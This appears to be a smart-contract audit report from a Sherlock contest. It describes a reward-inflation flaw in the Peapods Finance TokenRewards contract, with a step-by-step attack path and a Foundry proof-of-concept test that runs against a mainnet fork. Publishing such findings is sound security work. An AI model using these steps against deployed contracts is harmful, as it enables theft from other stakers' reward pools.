# Dilution of rewards pool of `TokenRewards`, when existing stakers are adding shares.

### Summary

In [`TokenRewards.sol`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/TokenRewards.sol), when [`setShares`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/TokenRewards.sol#L97C1-L112C1) function is invoked with `_shareRemoving` as false from [`StakingPoolToken.sol`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/StakingPoolToken.sol#L101C1-L109C6) for adding shares via `_addShares` function for exisitng staker who already have shares in his _wallet trying to add new shares in his _wallet, will lead to reward diluation of rewardPool given that new rewardShares are being added from `depositRewards` after the intial addShares of existing staker.

### Root Cause

In `TokenRewards.sol` -> `Reward` struct there are two elements excluded & realized. Which is getting used in both `_distributeReward` -> `getUnpaid` and `_resetExcluded`. 

In which `realized` and `excluded` are getting inflated in the described scenario:  
Take this scenario where a user is already a staker with shares equivalent to 100e18, after his first addition of shares new rewards is being added via depositRewards to add reward to rewardToken address after certain timeframe let's assume 1week. After which user is adding more shares which is leading to diluation of rewards for other new stakers.


### Internal Pre-conditions

- Contract must have rewards deposited
- `totalShares` must be greater than 0

### External Pre-conditions

- A user must have existing shares in the system
- Additional rewards must have been deposited since their initial share addition
- The user must perform another share addition operation

### Attack Path

- User initially stakes tokens (adds shares)
- Wait for rewards to accumulate in the system via `depositRewards`
- User adds more shares, triggering:
    - Distribution of pending rewards and reset of excluded rewards, after adding more rewards to reward pool leading to gaining more rewards then he should have.
- Reiterate the above steps to maximize inflation.


### Impact

Loss of Funds. This vulnerability allows users to inflate their rewards by repeatedly adding shares. 

### PoC

To test this PoC add it to `TokenRewards.t.sol` and use command `forge test --mt test_addSharesResetExclude --rpc-url <mainnet-url>`

```solidity
function test_addSharesResetExclude() public {

// Setup initial state

rewardsWhitelister.setWhitelist(address(rewardsToken), true);

console.log("\n=== Initial Setup ===");

// Mint and deposit initial rewards

rewardsToken.mint(address(this), 1000e18);

tokenRewards.depositRewards(address(rewardsToken), 100e18);

console.log("Initial rewards deposited:", 100e18);

// First time user adds shares

vm.startPrank(address(trackingToken));

tokenRewards.setShares(user1, 100e18, false);

vm.stopPrank();

// Record state after first share addition

(uint256 excluded1, uint256 realized1) = tokenRewards.rewards(address(rewardsToken), user1);

console.log("\n=== After First Share Addition ===");

console.log("Shares:", tokenRewards.shares(user1));

console.log("Excluded:", excluded1);

console.log("Realized:", realized1);

// Time passes (1 week)

vm.warp(block.timestamp + 1 weeks);

// New rewards are added during this time

tokenRewards.depositRewards(address(rewardsToken), 50e18);

console.log("\n=== After Time Skip and New Rewards ===");

console.log("Additional rewards deposited:", 50e18);

// Calculate expected rewards before second share addition

uint256 expectedBeforeSecond = tokenRewards.exposedCumulativeRewards(

address(rewardsToken),

100e18, // current shares

false // no rounding up

);

console.log("Expected rewards before second addition:", expectedBeforeSecond);

// User adds more shares

vm.prank(address(trackingToken));

tokenRewards.setShares(user1, 50e18, false); // Adding 50e18 more shares

// Get final state

(uint256 excludedFinal, uint256 realizedFinal) = tokenRewards.rewards(address(rewardsToken), user1);

// Calculate what rewards should have been with total shares

uint256 expectedTotal = tokenRewards.exposedCumulativeRewards(

address(rewardsToken),

150e18, // total shares after both additions

false // no rounding up

);

console.log("\n=== Final State ===");

console.log("Final shares:", tokenRewards.shares(user1));

console.log("Final excluded:", excludedFinal);

console.log("Final realized:", realizedFinal);

console.log("Expected total rewards:", expectedTotal);

console.log("Actual total (excluded + realized):", excludedFinal + realizedFinal);

console.log("Difference:", (excludedFinal + realizedFinal) - expectedTotal);

// Demonstrate reward dilution

assertGt(

excludedFinal + realizedFinal,

expectedTotal,

"Reward pool should be diluted due to incorrect reward calculation"

);

// Show the percentage of dilution

uint256 dilutionPercent = ((excludedFinal + realizedFinal) - expectedTotal) * 100 / expectedTotal;

console.log("\n=== Dilution Analysis ===");

console.log("Dilution percentage:", dilutionPercent, "%");

}
```
